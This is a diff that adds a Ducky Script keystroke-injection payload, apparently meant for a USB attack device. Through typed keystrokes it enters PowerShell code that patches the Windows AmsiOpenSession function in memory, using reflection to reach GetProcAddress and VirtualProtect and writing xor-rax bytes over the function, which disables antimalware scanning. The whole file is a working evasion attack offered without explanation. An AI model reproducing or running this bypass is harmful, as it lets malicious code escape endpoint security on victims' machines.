@@ -1,0 +1,44 @@
+DEFAULTCHARDELAY 15
+
+STRINGLN function LookupFunc {
+STRINGLN Param ($moduleName, $functionName)
+STRINGLN $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
+STRINGLN 	Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+STRINGLN 		Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+STRINGLN 	$tmp=@()
+STRINGLN 	$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+STRINGLN 	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+STRINGLN }
+ENTER
+STRINGLN function getDelegateType {
+STRINGLN Param (
+STRINGLN 	[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+STRINGLN 	[Parameter(Position = 1)] [Type] $delType = [Void]
+STRINGLN 	)
+STRINGLN $type = [AppDomain]::CurrentDomain.
+STRINGLN 	DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
+STRINGLN 	[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+STRINGLN 		DefineDynamicModule('InMemoryModule', $false).
+STRINGLN 		DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
+STRINGLN 		[System.MulticastDelegate])
+STRINGLN $type.
+STRINGLN 	DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
+STRINGLN 		SetImplementationFlags('Runtime, Managed')
+STRINGLN $type.
+STRINGLN 	DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
+STRINGLN 		SetImplementationFlags('Runtime, Managed')
+STRINGLN return $type.CreateType()
+STRINGLN }[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
+ENTER
+STRINGLN $oldProtectionBuffer = 0
+ENTER
+STRINGLN $vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+ENTER
+STRINGLN $vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
+ENTER
+STRINGLN $buf = [Byte[]] (0x48, 0x31, 0xC0) 
+ENTER
+STRINGLN [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
+ENTER
+STRINGLN $vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
+ENTER
